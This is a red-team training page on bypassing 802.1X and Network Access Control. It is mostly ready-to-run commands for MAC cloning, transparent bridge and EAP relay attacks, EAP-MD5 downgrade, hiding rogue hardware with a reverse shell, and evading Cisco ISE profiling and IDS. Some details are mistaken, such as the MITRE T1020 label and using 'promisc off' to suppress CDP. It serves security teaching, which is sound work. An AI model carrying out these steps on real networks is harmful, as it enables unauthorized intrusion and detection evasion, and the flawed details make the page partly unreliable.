---
layout: training-page
title: "NAC / 802.1X Bypass — Red Team Academy"
module: "Network Attacks"
tags:
  - nac
  - 802.1x
  - network-access-control
  - mac-spoofing
  - eap
  - network
page_key: "network-nac-bypass"
render_with_liquid: false
---

# NAC / 802.1X Bypass

Network Access Control (NAC) systems use 802.1X port authentication, MAC address filtering, or endpoint posture checking to restrict which devices can access network segments. These controls are frequently misconfigured and bypassable through MAC cloning, bridge attacks, or EAP relay.

## 802.1X Overview

```
Components:
  Supplicant  — the device requesting access (workstation)
  Authenticator — the switch port; enforces policy
  Auth Server — RADIUS server (FreeRADIUS, Cisco ISE, etc.)

Flow:
  Supplicant → EAPOL Start → Authenticator
  Authenticator → EAP Request/Identity → Supplicant
  Supplicant → EAP Response/Identity → Authenticator
  Authenticator → RADIUS Access-Request → RADIUS Server
  RADIUS Server → RADIUS Access-Accept/Reject → Authenticator
  Authenticator → EAP Success/Failure → Supplicant
  [If success] Port transitions to authorized state

EAP methods (common):
  EAP-TLS    — certificate-based mutual auth (strongest)
  PEAP/MSCHAPv2 — username/password wrapped in TLS (common)
  EAP-TTLS   — similar to PEAP; inner auth via PAP/MSCHAPv2
  EAP-MD5    — weak, deprecated; crackable offline
```

## Bypass 1: MAC Address Cloning

```bash
# Most common bypass — NAC allowlists printer/IoT/legacy device MACs
# If you can read the MAC from the device label or network scan,
# clone it to get port access

# Identify an already-authorized MAC (printers, IoT, VoIP phones)
# Methods:
# - Physical: read label on printer/phone
# - Network: passively sniff DHCP/ARP traffic for non-802.1X devices
# - SNMP: query switch ARP/MAC table (if SNMP is accessible)

# Spoof MAC on Linux
ip link set eth0 down
ip link set eth0 address AA:BB:CC:DD:EE:FF
ip link set eth0 up

# Or with macchanger
macchanger -m AA:BB:CC:DD:EE:FF eth0

# Connect and request DHCP
dhclient eth0

# Verify
ip addr show eth0
arp -n | grep eth0
```

## Bypass 2: 802.1X Bridge Attack (Transparent Bridge)

```bash
# Physical: plug rogue device between an authorized device and the switch
# Authorized device authenticates → port becomes authorized
# Bridge forwards all traffic including attacker's

#  Switch ── Authorized Workstation
#  Switch ── [Rogue Device (bridge)] ── Authorized Workstation

# Linux bridge setup
apt install bridge-utils

ip link set eth0 up   # interface facing switch
ip link set eth1 up   # interface facing authorized PC

brctl addbr br0
brctl addif br0 eth0
brctl addif br0 eth1
ip link set br0 up

# Configure attacker on bridge interface with different MAC
# The bridge is transparent — 802.1X auth from workstation passes through
# Your traffic also egresses through the authorized port

# Nmap the internal network through the bridge
nmap -e br0 192.168.1.0/24
```

## Bypass 3: EAP Relay (marvin attack)

```bash
# For environments using EAP-TLS or certificate-based auth:
# If you can intercept EAP frames, relay them between victim and RADIUS
# The auth completes, but your device gets the access

# marvin — 802.1X relay attack tool
# github.com/Orange-Cyberdefense/marvin

# Prerequisites:
# - Physical access between switch and a device with valid certificate
# - Two network interfaces (one facing switch, one facing victim device)

python3 marvin.py --listen eth0 --relay eth1

# Once relay succeeds, configure attacker IP on eth0
```

## Bypass 4: VLAN Misconfiguration

```bash
# Some NAC deployments put unauthenticated devices in a "guest VLAN"
# If the guest VLAN has routing to internal segments (misconfiguration),
# you can reach internal resources without authenticating

# Check what VLAN you're placed in
ip addr show  # get DHCP address range
# 192.168.100.x = guest VLAN? Try to reach internal:
ping 10.0.0.1
curl http://10.0.0.1:80

# VLAN hopping from guest VLAN to internal
# See: network-attacks/vlan-hopping
```

## Bypass 5: Post-Authentication Monitoring Gaps

```bash
# Many NAC systems only check identity at port-up time
# They don't continuously verify the authorized device is still connected

# Disconnect authorized device → reconnect rogue device quickly
# Some switches maintain the authorized state for a grace period
# Or: hot-swap cable while switch port stays authorized

# Monitor switch MAC table aging timeout:
# If timeout > 0, authorized MAC state persists briefly after disconnect
# Aggressive plug/unplug during the window can work
```

## Reconnaissance

```bash
# Identify if 802.1X is in use
# - EAPOL frames visible on wire: tcpdump 'ether proto 0x888e'
# - EAP exchange visible in Wireshark
# - Trying to connect without auth → only gets DHCP from guest VLAN or no DHCP

# Identify authorized devices for MAC cloning targets
# Passive approach: listen for DHCP, ARP, or CDP/LLDP from non-802.1X ports
tcpdump -i eth0 'udp port 67 or udp port 68'   # DHCP broadcasts
tcpdump -i eth0 'arp'                           # ARP from authorized devices
tcpdump -i eth0 'ether proto 0x2000'            # CDP (reveals device type)

# Printers and IoT devices often bypass 802.1X via MAC auth bypass (MAB)
# These are prime cloning candidates
```

## Detection

```
802.1X bypass indicators:
  - Same MAC seen on multiple ports simultaneously (bridge attack)
  - MAC address mismatch with DHCP hostname / fingerprint
  - Device type (OS fingerprint) doesn't match expected device class
  - EAPOL frames on port that should only have MAB devices
```

## 802.1X EAP Relay Attacks

EAP relay works by positioning the attacker between the supplicant (authorized device) and the authenticator (switch). The legitimate EAP exchange passes through the attacker, who piggybacks access.

```bash
# marvin — 802.1X EAP relay tool
# github.com/Orange-Cyberdefense/marvin
# Requires: two NICs (one facing switch, one facing authorized device)

# Physical setup:
#   [Switch] ─── [Attacker eth0] ─── [Attacker eth1] ─── [Authorized Workstation]

# Install marvin
git clone https://github.com/Orange-Cyberdefense/marvin
cd marvin
pip3 install -r requirements.txt

# Run relay (eth0 = switch-side, eth1 = device-side)
python3 marvin.py --listen eth0 --relay eth1

# marvin intercepts the EAP exchange:
# 1. Switch sends EAP Request/Identity to attacker eth0
# 2. marvin forwards it to the authorized device via eth1
# 3. Authorized device responds with valid credentials
# 4. marvin forwards the response to the switch
# 5. Switch authenticates the port
# 6. Attacker now has authorized access on eth0

# After authentication completes:
# Assign IP to eth0 (switch-side interface)
dhclient eth0
# Or manually: ip addr add 192.168.1.200/24 dev eth0

# Transparent mode — authorized device stays connected and working
# Bridge mode setup (bridge between authorized device and switch while also injecting traffic)
ip link set eth0 up
ip link set eth1 up
brctl addbr br0
brctl addif br0 eth0
brctl addif br0 eth1
ip link set br0 up
# Then inject your own traffic on br0 or eth0

# For EAP-TLS relay (certificate-based auth):
# The certificate exchange happens over EAP — marvin relays the full TLS handshake
# The authorized workstation proves it has the certificate; attacker gets the port
# This works because the switch only verifies the EAP exchange, not which physical device is on the port
```

## MAC Spoofing Techniques

```bash
# Identify target MAC to clone first (see Reconnaissance section)
# Then spoof at the interface level before connecting

# Method 1: ip link (iproute2 — most reliable)
ip link set eth0 down
ip link set eth0 address AA:BB:CC:DD:EE:FF
ip link set eth0 up
ip addr show eth0  # verify MAC changed

# Method 2: macchanger (dedicated tool)
apt install macchanger
# Spoof to specific MAC
macchanger -m AA:BB:CC:DD:EE:FF eth0
# Random vendor MAC (from known OUI table)
macchanger -A eth0
# Fully random MAC
macchanger -r eth0
# Show current and permanent MAC
macchanger -s eth0

# Method 3: ifconfig (legacy)
ifconfig eth0 down
ifconfig eth0 hw ether AA:BB:CC:DD:EE:FF
ifconfig eth0 up

# Make spoofed MAC persistent across reboots (systemd-networkd)
cat > /etc/systemd/network/00-eth0.link << 'EOF'
[Match]
MACAddress=<original MAC>

[Link]
MACAddress=AA:BB:CC:DD:EE:FF
EOF
systemctl restart systemd-networkd

# Alternatively with udev rule (persists across reboots)
cat > /etc/udev/rules.d/70-mac-spoof.rules << 'EOF'
ACTION=="add", SUBSYSTEM=="net", ATTR{address}=="<original>", ATTR{address}="AA:BB:CC:DD:EE:FF"
EOF

# Get DHCP with spoofed MAC
dhclient eth0
# Verify you got an IP (means NAC accepted the cloned MAC)
ip addr show eth0
```

## Identifying NAC-Enrolled Devices to Clone

The best clone targets are devices that bypass 802.1X via MAC Authentication Bypass (MAB) — printers, IP phones, IoT devices, cameras.

```bash
# Passive discovery — watch for traffic from devices that aren't doing EAP
tcpdump -i eth0 'ether proto 0x888e' -v
# 0x888e = EAPOL (802.1X traffic)
# Devices NOT sending EAPOL but still communicating = MAB candidates

# Listen for DHCP broadcasts — reveals MACs, hostnames, device types
tcpdump -i eth0 'udp port 67 or udp port 68' -v
# DHCP Option 60 (Vendor Class) reveals device type: HP Printer, Cisco Phone, etc.
# DHCP Option 12 (Hostname) reveals device name

# ARP observation — collect MACs passively
tcpdump -i eth0 'arp' -e 2>/dev/null | head -50
# Look for: MAC addresses with OUI of printer/IoT vendors

# OUI lookup to identify device vendors
# Install oui-data or use online lookup
# Common printer OUIs: 00:1B:78 (HP), 00:00:48 (Kyocera), 00:0D:93 (Brother)
# Common VoIP phone OUIs: 00:07:0E (Cisco IP Phone), 00:60:09 (Cisco)
# IoT devices often use: 18:FE:34 (Espressif/ESP8266), B8:27:EB (Raspberry Pi)

# SNMP — query switch MAC-address table (if SNMP accessible)
snmpwalk -c public -v2c 192.168.1.1 1.3.6.1.2.1.17.4.3.1.2
# MIB: dot1dTpFdbAddress — bridge forwarding table (MAC to port mapping)

# CDP/LLDP — devices announce themselves
tcpdump -i eth0 'ether proto 0x2000' -v  # CDP
tcpdump -i eth0 'ether proto 0x88cc' -v  # LLDP
# CDP tells you: device name, IP, platform (e.g., "Cisco IP Phone CP-7965G")

# Physical observation — note MACs printed on device labels
# Printer labels, phone labels, IP camera labels often have MAC printed
# Photograph or note the MAC before cloning

# nmap device fingerprint scan (post-bypass, or from another authorized host)
nmap -O --osscan-guess -p 80,443,9100 192.168.1.0/24
# Port 9100 = printer (JetDirect), port 80 = device web UI
```

## Rogue Device Concealment

```bash
# Hide behind a hub/unmanaged switch
# Physical: [Switch Port] ─── [Unmanaged Hub] ─┬─ [Authorized Device]
#                                                └─ [Rogue Attacker]
# The switch sees one authorized MAC (from the authorized device doing 802.1X)
# The hub transparently passes all traffic
# Attacker uses the authorized device's MAC on their interface

# Piggyback on legitimate device traffic
# Method: Linux bridge (transparent, pass-through)
apt install bridge-utils
ip link set eth0 up   # switch-facing
ip link set eth1 up   # device-facing
brctl addbr br0
brctl addif br0 eth0
brctl addif br0 eth1
ip link set br0 up
# Attacker traffic exits through eth0 with spoofed MAC
# The bridge forwards all 802.1X frames transparently
# Assign IP directly to eth0 (not br0) to avoid MAC visibility issues

# Small form factor attack hardware
# Raspberry Pi Zero W or LAN Turtle: small enough to hide behind a desk device
# Configure beforehand with the target MAC and reverse shell
# Attacker accesses via Wi-Fi or reverse tunnel over the wired connection

# Avoid ARP broadcasting (reduces detection)
# Don't run ARP scans that reveal your presence
# Use targeted unicast requests or passive observation
```

## EAP Downgrade Attacks

```bash
# Some NAC configurations accept weaker EAP methods as fallback
# If the switch/RADIUS allows EAP-MD5, credentials can be captured and cracked

# Check what EAP methods the switch accepts
# Send EAP Response/Identity followed by EAP-MD5 request
# If switch accepts → RADIUS will send MD5 challenge → capturable

# hostapd-wpe — modified hostapd that captures EAP credentials
# github.com/OpenSecurityResearch/hostapd-wpe
# Originally for Wi-Fi but logic applies to 802.1X wired

# eapeak — scan for EAP method support
# github.com/securestate/eapeak
python3 eapeak.py -i eth0 -f capture.pcap

# Manual EAP method negotiation with Scapy
python3 << 'EOF'
from scapy.all import *
# Send EAPOL Start
eapol_start = Ether(dst="01:80:c2:00:00:03") / EAPOL(type=1)
sendp(eapol_start, iface="eth0")
# Listen for EAP Request/Identity
sniff(iface="eth0", filter="ether proto 0x888e", count=5, prn=lambda p: p.show())
EOF

# EAP-MD5 crack (if captured)
# hashcat -m 4800 for EAP-MD5
# Requires: challenge, response, and client ID from captured frames
```

## Cloud-Managed NAC: Detection Evasion

```
Cisco ISE and Aruba ClearPass are the dominant cloud/enterprise NAC platforms.
Both perform device profiling beyond just MAC authentication.

ISE (Identity Services Engine) profiling:
  Device profiling uses:
  - DHCP fingerprinting (Option 55 — parameter request list)
  - CDP/LLDP data from the switch
  - HTTP User-Agent if device accesses ISE portal
  - Nmap OS detection (ISE can run probes against device)
  - RADIUS attributes from 802.1X authentication

Evasion considerations:
  1. Match DHCP option 55 parameter request list of the cloned device
     Tools: DHCPig, scapy — craft DISCOVER with matching option 55
     HP printer Option 55: 1,3,6,15,44,46,47,43,150,228,229,241,242

  2. Suppress CDP/LLDP from your device (don't advertise what you are)
     ip link set eth0 promisc off
     Don't run CDP/LLDP daemons

  3. Match HTTP User-Agent if a captive portal check occurs
     Device web portals: use curl -A "HP LaserJet ..." if probed

  4. Stay quiet initially — don't immediately scan the network
     Wait 5-10 minutes; let NAC finish posture assessment before acting
     ISE typically sets a 5-minute re-evaluation window

  5. Avoid triggering IDS signatures:
     No ICMP flood, no SYN scan immediately after auth
     Use passive discovery (arp -a, listen) before active scanning

ClearPass:
  Similar profiling approach; also checks:
  - SNMP sysDescr if SNMP is accessible on the device
  - Device certificate (for EAP-TLS deployments)
  - OnGuard agent (if endpoint agent is required — harder to bypass)
```

## Resources

- marvin (EAP relay) — `github.com/Orange-Cyberdefense/marvin`
- macchanger — `github.com/alobbs/macchanger`
- MITRE T1556 — Modify Authentication Process — `attack.mitre.org/techniques/T1556/`
- MITRE T1020 — NAC Bypass research — DEF CON presentations
- Cisco ISE hardening guide — `cisco.com/c/en/us/td/docs/security/ise/`
- hostapd-wpe (EAP credential capture) — `github.com/OpenSecurityResearch/hostapd-wpe`
